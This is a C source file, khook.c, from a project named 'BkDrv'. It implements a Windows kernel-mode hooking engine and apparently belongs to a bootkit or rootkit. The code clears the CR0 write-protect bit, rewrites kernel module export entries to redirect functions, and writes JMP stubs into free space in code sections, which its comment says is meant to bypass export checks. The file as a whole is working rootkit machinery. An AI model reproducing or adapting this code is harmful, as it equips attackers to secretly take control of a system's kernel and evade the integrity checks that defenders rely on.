//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// BkDrv project
//	
// module: khook.c
// $Revision: 39 $
// $Date: 2012-05-02 15:38:09 +0400 (Ср, 02 май 2012) $
// description: 
//	Kernel-mode hooking engine implementation. Currently avaliable IAT and Export hooks.

#include <ntddk.h>
#include <ntimage.h>
#include "ntddkex.h"
#include "kdbg.h"
#include "bklib.h"

#include "khook.h"

#pragma intrinsic(_disable)
#pragma intrinsic(_enable)

#define		_USE_JMP_STUBS			TRUE

// ---- Types and constants ------------------------------------------------------------------------------------------------------
#define		SYS_INFO_BUFFER_MAX		0x1000

#define		WP_BIT_MASK				0x10000
#define		SYS_INFO_BUFFER_MAX		0x1000

#define		_ALIGN(x, y)	((x + (y - 1)) & ~(y - 1))


// ---- Globals -----------------------------------------------------------------------------------------------------------------
LIST_ENTRY	g_HookListHead = {0};
KSPIN_LOCK	g_HookListLock = 0;
KIRQL		g_HookListIrql;


// ---- Internal functions -------------------------------------------------------------------------------------------------------
static ULONG_PTR ReadCr0(VOID)
{
	ULONG_PTR	dwCr0;
#ifdef	_WIN64
	dwCr0 = __readcr0();
#else
	__asm
	{
		mov eax, cr0
		mov dwCr0, eax
	}
#endif
	return(dwCr0);
}

static VOID	WriteCr0(ULONG_PTR dwCr0)
{
#ifdef _WIN64
	__writecr0(dwCr0);
#else
	__asm
	{
		mov eax, dwCr0
		mov cr0, eax
	}
#endif
}

static VOID	HookListLock(VOID)
{
	KIRQL Irql;
	KeAcquireSpinLock(&g_HookListLock, &Irql);
	g_HookListIrql = Irql;
}

static VOID	HookListUnlock(VOID)
{
	KeReleaseSpinLock(&g_HookListLock, g_HookListIrql);
}


//
//	Returns base of the specified kernel module or NULL in case of an error.
//
static PVOID GetKernelModuleBase(
	PCHAR pModuleName	// Target module name (case sensitive)
	)
{
    PVOID		ModuleBase = NULL;
    PULONG		SysInfoBuffer = NULL;
	NTSTATUS	ntStatus = STATUS_INSUFFICIENT_RESOURCES;
    ULONG		SysInfoBufferSize = SYS_INFO_BUFFER_MAX;

	do 
	{
		if (!(SysInfoBuffer = MyAllocatePool(PagedPool, SysInfoBufferSize)))
			// Not enough memory
			break;

		ntStatus = ZwQuerySystemInformation(SystemModuleInformation, SysInfoBuffer, SysInfoBufferSize, &SysInfoBufferSize);

		if (!(NT_SUCCESS(ntStatus)))
		{
			MyFreePool(SysInfoBuffer);
			SysInfoBufferSize += SYS_INFO_BUFFER_MAX;
		}
	} while(!NT_SUCCESS(ntStatus));

	if (SysInfoBuffer)
	{
		PSYSTEM_MODULE pSysModule = (PSYSTEM_MODULE) &((PSYSTEM_MODULE_INFORMATION)(SysInfoBuffer))->aSM;
		ULONG NumberModules = ((PSYSTEM_MODULE_INFORMATION)(SysInfoBuffer))->uCount;

		do 
		{
			PCHAR	Dot, pShortName = (PCHAR)&pSysModule->ImageName + pSysModule->ModuleNameOffset;

			// Compare short name first
			if (_stricmp(pShortName, pModuleName) == 0)
			{
				ModuleBase = (PVOID)pSysModule->Base;
				break;
			}

			// Compare name without extension
			if (Dot = strchr(pShortName, '.'))
			{
				 Dot[0] = 0;
				 if (_stricmp(pShortName, pModuleName) == 0)
				 {
					 ModuleBase = (PVOID)pSysModule->Base;
					 break;
				 }
			 }	// if (Dot = strchr(ShortName, '.'))

			pSysModule += 1;
		} while(NumberModules -= 1);

	    MyFreePool(SysInfoBuffer);
    }	// if (SysInfoBuffer)

    return(ModuleBase);
} 


PVOID 
	GetModuleBase(
		PCHAR pModuleName	// Target module name (case sensitive)
		)
{
	PVOID TargetBase;
	if (BkNtKernelBase)
		// Resolve image base over the BK API
		TargetBase = BkGetModuleBase(pModuleName);
	else
		// Resolve image base manually
		TargetBase = GetKernelModuleBase(pModuleName);
	return TargetBase;
}


//
//	Searches for a free space within module code section(s) enough to create JMP stub.
//
static PJMP_STUB HookFindExportStub(
	PVOID	ModuleBase,			// Target module
	PVOID	ExportedFunction	// Address of the exported function to hook (to check for reused stubs)
	)
{
	PJMP_STUB	Stub = NULL;
	USHORT		NumberSections;
	ULONG		SectionFlags = (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_NOT_PAGED);
	PIMAGE_NT_HEADERS		Pe = (PIMAGE_NT_HEADERS)((PCHAR)ModuleBase + ((PIMAGE_DOS_HEADER)ModuleBase)->e_lfanew);
	PIMAGE_SECTION_HEADER	Section = IMAGE_FIRST_SECTION(Pe);

	NumberSections = Pe->FileHeader.NumberOfSections;

	do 
	{
		if ((Section->Characteristics & SectionFlags) == SectionFlags)
		{
			ULONG	RealSize = _ALIGN(Section->SizeOfRawData, Pe->OptionalHeader.FileAlignment);
			ULONG	VirtualSize = max(_ALIGN(Section->Misc.VirtualSize, Pe->OptionalHeader.SectionAlignment), RealSize);
			ULONG	BufferSize;
			PCHAR	Buffer;

			if (Section->Characteristics & IMAGE_SCN_MEM_DISCARDABLE)			
				RealSize = 0;
			
			Buffer = (PCHAR)ModuleBase + Section->VirtualAddress + RealSize;
			BufferSize = VirtualSize - RealSize;

			while((Stub == NULL) && (BufferSize >= sizeof(JMP_STUB)))
			{
				Stub = (PJMP_STUB)Buffer;
#ifdef	_WIN64
				if (Stub->Opcode == JMP_STUB_OPCODE && Stub->Offset == 0 && Stub->Address != (ULONG_PTR)ExportedFunction)
#else
				if (Stub->Opcode == JMP_STUB_OPCODE && ((ULONG_PTR)&Stub[1] + Stub->Offset != (ULONG_PTR)ExportedFunction))
#endif
				{
					// This stub is already used, try to select the next one.
					Buffer += sizeof(JMP_STUB);
					BufferSize -= sizeof(JMP_STUB);
					Stub = NULL;
				}
			}	// while(!(Stub) && (BufferSize >= sizeof(JMP_STUB)))
		}	// if ((Section->Characteristics &
		Section += 1;
	} while (Stub == NULL && (NumberSections -= 1));

	return(Stub);
}


//
//	Sets the specified hook.
//
VOID	SetHook(
	PHOOK	pHook,			// hooked function descriptor
	PVOID	pHookedEntry,	
	PVOID	ModuleBase		// target image base (where export should be hooked)
)
{
	PEXPORT_ENTRY	pExportEntry = (PEXPORT_ENTRY)pHookedEntry;
	PIAT_ENTRY		pIatEntry = (PIAT_ENTRY)pHookedEntry;
	KIRQL			Irql;
	ULONG_PTR		Cr0;

	InitializeListHead(&pHook->Entry);
	pHook->OriginalEntry = pHookedEntry;

	if (pHook->Flags & HOOK_TYPE_EXPORT)
	{
		pHook->OriginalValue = (ULONG_PTR)(*pExportEntry);
		pHook->HookFn->Original = (PVOID)(pHook->OriginalValue + (ULONG_PTR)ModuleBase);
	}
	else
	{
		pHook->OriginalValue = *pIatEntry;
		pHook->HookFn->Original = (PVOID)*pIatEntry;
	}

	if (!BkNtKernelBase)
		Irql = KeRaiseIrqlToDpcLevel();

	Cr0 = ReadCr0();

	// Reseting CR0.WP bit
	WriteCr0(Cr0 & (~WP_BIT_MASK));

#ifdef _USE_JMP_STUBS
	// This code creates JMP XXXX stubs in the free space at the ends of the target module code sections.
	// Then theese stubs are set as hook functions and jump to original hooks.
	// The reason - to bypass possible export checks: if module export points to an other module.
	{
		PJMP_STUB Stub = HookFindExportStub(ModuleBase, pHook->HookFn->Original);
		if (Stub)
		{
#ifdef _WIN64
			ASSERT(Stub->Opcode != JMP_STUB_OPCODE || (Stub->Offset == 0 && Stub->Address == (ULONG_PTR)pHook->HookFn->Original));
			Stub->Offset = 0;
			Stub->Address = (ULONG_PTR)pHook->HookFn->Address;
#else
			ASSERT(Stub->Opcode != JMP_STUB_OPCODE || ((ULONG_PTR)&Stub[1] + Stub->Offset == (ULONG_PTR)pHook->HookFn->Original));
			Stub->Offset = (ULONG)((ULONG_PTR)pHook->HookFn->Address - (ULONG_PTR)&Stub[1]);
#endif
			Stub->Opcode = JMP_STUB_OPCODE;
			pHook->HookFn->Address = Stub;
			pHook->HookFn->Stub = Stub;
		}
	}
#endif
	// Patching original entry
	if (pHook->Flags & HOOK_TYPE_EXPORT)
		*pExportEntry = (EXPORT_ENTRY)((ULONG_PTR)pHook->HookFn->Address - (ULONG_PTR)ModuleBase);
	else
		*pIatEntry = (IAT_ENTRY)pHook->HookFn->Address;
	
	// Restoring CR0.WP bit
	WriteCr0(Cr0);

	if (!BkNtKernelBase)
		KeLowerIrql(Irql);

	pHook->Flags |= HOOK_SET;

//	Locks are not required when setting hooks within the BK init routine.
//	HookListLock();
	InsertHeadList(&g_HookListHead, &pHook->Entry);		// Last In First Out	;)
//	HookListUnlock();
}


//
//	Restores previously set hook.
//	Returns TRUE if the hook was restored.
//
BOOL RestoreHook(
	PHOOK	pHook			// hooked function descriptor
	)
{
	BOOL	Ret = FALSE;
	PIAT_ENTRY	pIatEntry;
	ULONG_PTR	Cr0;

	if (!(pHook->Flags & HOOK_TYPE_EXPORT))
	{
		pIatEntry = (PIAT_ENTRY)pHook->OriginalEntry;
		if (*pIatEntry != (IAT_ENTRY)pHook->HookFn->Address)
		{
			_disable();
			Cr0 = ReadCr0();

			// Reseting CR0.WP bit
			WriteCr0(Cr0 & (~WP_BIT_MASK));

			*pIatEntry = (IAT_ENTRY)pHook->HookFn->Address;

			// Restoring CR0.WP bit
			WriteCr0(Cr0);

			_enable();
			Ret = TRUE;
		}	// if (*pIatEntry != (IAT_ENTRY)pHook->HookFn->Address)
	}	// if (!(pHook->Flags & HOOK_TYPE_EXPORT))
	return(Ret);
}


//
//	Hooks module's export table.
//	If the function succeeds, the return value is NO_ERROR. 
//	If the function fails, the return value is a nonzero error code defined in Winerror.h.
//
NTSTATUS	SetExportHook(
	PHOOK	pHook,			// hooked function descriptor
	PVOID	ModuleBase		// target image base (where export should be hooked)
)
{
	NTSTATUS	ntStatus = STATUS_OBJECT_NAME_NOT_FOUND;
	PEXPORT_ENTRY pExportEntry;

	ASSERT(ModuleBase);
	pExportEntry = BkGetExportEntry(ModuleBase, pHook->HookFn->HookedFunction);

	if (pExportEntry)
	{
		SetHook(pHook, pExportEntry, ModuleBase);
		ntStatus = STATUS_SUCCESS;
	}	// if (pExportEntry)

	return(ntStatus);
}


//
//	Sets multiple hooks of different types described by specified array of HOOK_DESCRIPTORs.
//	If the function succeeds, the return value is STATUS_SUCCESS. 
//	If the function fails, the return value is a nonzero error code defined in ntstatus.h.
//	
NTSTATUS SetMultipleHooks(
	PHOOK				pHook,			// array of HOOK_DESCRIPTOR structures
	LONG				NumberHooks,	// number of elements in the array
	PVOID				ModuleBase		// Target module base (for IAT hooks only)
)
{
	NTSTATUS ntStatus = STATUS_SUCCESS;
	LONG i;

	for (i=0; (i < NumberHooks && ntStatus == STATUS_SUCCESS); i++)
	{
		ULONG HookType = pHook->Flags & HOOK_TYPE_MASK;

		switch(HookType)
		{
		case HOOK_TYPE_IAT:
//			ntStatus = SetIatHook(pHookDesc->pHookFn, ModuleBase, &pHookDesc->pHook);
			UNREFERENCED_PARAMETER(ModuleBase);
			ASSERT(FALSE);	// currently not supported
			break;
		case HOOK_TYPE_EXPORT:
			{
				PVOID	TargetBase;
				if (TargetBase = GetModuleBase(pHook->HookFn->HokedModule))
				{
					ntStatus = SetExportHook(pHook, TargetBase);
					if ( ntStatus != STATUS_SUCCESS && 
						((pHook->Flags & HOOK_CAN_FAIL) == HOOK_CAN_FAIL ) )
					{
						ntStatus = STATUS_SUCCESS;
					}
				}	// if (TargetBase = GetModuleBase(pHook->HookFn->HokedModule))
			}
			break;
		default:
			ASSERT(FALSE);
			break;
		}
		pHook += 1;
	}	// for (i=0; (i < NumberHooks && ntStatus == STATUS_SUCCESS); i++)

	return(ntStatus);
}


//
//	Removes a hook, described by specified HOOK structure.
//	If the function succeeds, the return value is NO_ERROR. 
//	If the function fails, the return value is a nonzero error code defined in Winerror.h.
//
static NTSTATUS RemoveHookInternal(
	PHOOK pHook		// a HOOK structure, that describes a hook to remove
)
{
	NTSTATUS	ntStatus = STATUS_SUCCESS;	
	ULONG		HookType = (pHook->Flags & HOOK_TYPE_MASK);
	ULONG_PTR	Cr0 = ReadCr0();

	ASSERT(KeGetCurrentIrql() >= DISPATCH_LEVEL);
	ASSERT(pHook->Flags & HOOK_SET);
	WriteCr0(Cr0 & (~WP_BIT_MASK));

	switch (HookType)
	{
	case HOOK_TYPE_EXPORT:
		{
#ifdef _USE_JMP_STUBS
			// Adjust JMP stubs to jump directlty to a target function
			PJMP_STUB pStub = (PJMP_STUB)pHook->HookFn->Stub;
			if (pStub && pStub->Opcode == JMP_STUB_OPCODE)
			{
#ifdef _WIN64
				ASSERT(pStub->Offset == 0);
				pStub->Address = (ULONG_PTR)pHook->HookFn->Original;
#else
				pStub->Offset = (ULONG)((ULONG_PTR)pHook->HookFn->Original - (ULONG_PTR)&pStub[1]);
#endif	// _WIN64
			}	// if (pStub->Opcode == JMP_STUB_OPCODE)
#endif	// _USE_JMP_STUBS
		}
	case HOOK_TYPE_IAT:
		// NOTE: IAT_ENTRY and EXPORT_ENTRY have different sizes on x64.
		if (HookType == HOOK_TYPE_IAT)
			*(PIAT_ENTRY)pHook->OriginalEntry = (IAT_ENTRY)pHook->OriginalValue;
		else
			*(PEXPORT_ENTRY)pHook->OriginalEntry = (EXPORT_ENTRY)pHook->OriginalValue;

		pHook->Flags &= (~HOOK_SET);
		break;
	default:
		ntStatus = STATUS_INVALID_PARAMETER;
		break;
	}	// switch (HookType)

	WriteCr0(Cr0);

	return(ntStatus);
}



//
//	Removes registered hooks for the specified hook function. If no function specified - all hook are removed.
//	If the function succeeds, the return value is number of hooks removed. 
//	If the function fails, the return value is 0.
//
ULONG RemoveAllHooks(PHOOK_FUNCTION pHookFn)
{
	ULONG HookCount = 0;
	PLIST_ENTRY pFirst, pEntry;

	HookListLock();

	pFirst = &g_HookListHead;
	pEntry = pFirst->Flink;

	while (pEntry != pFirst)
	{
		PHOOK pHook = CONTAINING_RECORD(pEntry, HOOK, Entry);
		pEntry = pEntry->Flink;

		if (pHookFn == NULL || pHookFn == pHook->HookFn || pHookFn->Stub == pHook->HookFn)
		{
			if (!NT_SUCCESS(RemoveHookInternal(pHook)))
			{
				ASSERT(FALSE);
			}
		RemoveEntryList(&pHook->Entry);
		HookCount += 1;
		}	// if (pHookFn == NULL ||
	}	// while (pEntry != pFirst)

	HookListUnlock();

	return(HookCount);
}


VOID	HookDump(VOID)
{
	ULONG HookCount = 0;
	PLIST_ENTRY pFirst, pEntry;

	KdPrint(("Dumping hooks:\n"));

	if (g_HookListHead.Flink)
	{
		HookListLock();

		pFirst = &g_HookListHead;
		pEntry = pFirst->Flink;

		while (pEntry != pFirst)
		{
			PHOOK pHook = CONTAINING_RECORD(pEntry, HOOK, Entry);
			pEntry = pEntry->Flink;

	#ifdef _WIN64
			KdPrint(("Hooked entry 0x%p, hooked function 0x%p, hook function 0x%p\n", pHook->OriginalEntry, pHook->HookFn->Original, pHook->HookFn->Address));
	#else
			KdPrint(("Hooked entry 0x%p, hooked function 0x%p, hook function 0x%p\n", pHook->OriginalEntry, pHook->HookFn->Original, pHook->HookFn->Address));
	#endif

			HookCount += 1;
		}	// while (pEntry != pFirst)

		HookListUnlock();
	}

	KdPrint(("Totally %u hooks found.\n", HookCount));
}


//
// Call stub for x86 functions
// it pushes additional parameter as the 1st argument
//

FORCEINLINE
PVOID 
	x86MakeCallStub(
		IN PCALL_STUB CallStub,
		IN PVOID Handler,
		IN PVOID Context,
		IN ULONG nArgs
		)
{
	CallStub->OpPopEax     = OP_POP_EAX;
	CallStub->OpPushDword  = OP_PUSH_DWORD;
	CallStub->Ptr          = (ULONG)Context;
	CallStub->OpPushEax    = OP_PUSH_EAX;
	CallStub->OpJmp        = OP_JMP_NEAR;
	CallStub->Offset       = (ULONG)((ULONG_PTR)Handler - ((ULONG_PTR)CallStub + sizeof(CALL_STUB)));
	return (PVOID)CallStub;
}

#if _AMD64_
// some externs from x64stubs
//extern PVOID CallStub1;
//extern ULONG CallStub1SIZE;

extern PVOID CallStub3;
extern ULONG CallStub3SIZE;

extern PVOID CallStub6;
extern ULONG CallStub6SIZE;

//extern PVOID CallStub8;
//extern ULONG CallStub8SIZE;

#pragma pack( push, 1 )
typedef struct _ASM_FIELDS {
	PVOID HookFn;
	PVOID Context;
}ASM_FIELDS,*PASM_FIELDS;
#pragma pack( pop )

// stub from function having 6 args
FORCEINLINE
PVOID 
	_x64MakeCallStub( // for 6 args
		IN PVOID Dest,
		IN PVOID Stub,
		IN ULONG Size,
		IN PVOID Handler,
		IN PVOID Context
		)
{
	PASM_FIELDS pAsmFieldsSRC = (PASM_FIELDS)((PCHAR)Stub-sizeof(ASM_FIELDS));
	PASM_FIELDS pAsmFieldsDST = (PASM_FIELDS)Dest;
	RtlCopyMemory(Dest,pAsmFieldsSRC,Size+sizeof(ASM_FIELDS));
	pAsmFieldsDST->HookFn = Handler;
	pAsmFieldsDST->Context = Context;
	return (PVOID)((PCHAR)Dest+sizeof(ASM_FIELDS));
}

FORCEINLINE
PVOID 
	x64MakeCallStub(
		IN PVOID CallStub,
		IN PVOID Handler,
		IN PVOID Context,
		IN ULONG nArgs
		)
{
	PVOID Stub = NULL;
	ULONG Size = 0;

	switch ( nArgs )
	{
	//case 1:
	//	Stub = CallStub1;
	//	Size = CallStub1SIZE;
	//	break;
	case 3:
		Stub = CallStub3;
		Size = CallStub3SIZE;
		break;
	case 6:
		Stub = CallStub6;
		Size = CallStub6SIZE;
		break;
	//case 8:
		//Stub = CallStub8;
		//Size = CallStub8SIZE;
		//break;
	}

	if ( Stub ){
		return _x64MakeCallStub(CallStub,Stub,Size,Handler,Context);
	}
	return NULL;
}
#endif

PVOID 
	MakeCallStub(
		IN PVOID CallStub,
		IN PVOID Handler,
		IN PVOID Context,
		IN ULONG nArgs
		)
{
#if _X86_
	return x86MakeCallStub(CallStub,Handler,Context,nArgs);
#else
	return x64MakeCallStub(CallStub,Handler,Context,nArgs);
#endif
}



// ---- Startup/Cleanup routines -------------------------------------------------------------------------------------------------

NTSTATUS HookInit(VOID)
{
	NTSTATUS ntStatus = STATUS_SUCCESS;
	InitializeListHead(&g_HookListHead);
	return(ntStatus);
}